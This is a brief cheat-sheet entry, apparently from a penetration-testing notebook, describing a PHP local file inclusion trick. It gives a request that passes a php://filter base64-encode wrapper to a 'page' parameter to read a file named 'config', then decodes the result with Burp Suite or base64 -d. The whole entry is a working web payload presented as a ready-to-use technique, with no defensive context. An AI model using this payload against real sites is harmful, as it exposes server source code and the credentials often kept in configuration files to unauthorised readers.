# Web encode to read PHP files

## Burpsuit encode Trick

GET /?page='php://filter/convert.base64-encode/resource'=<Page to read>

`GET /?page=php://filter/convert.base64-encode/resource=config`

After this you can use decode from burpsuit or 'base64 -d' from linux terminal.
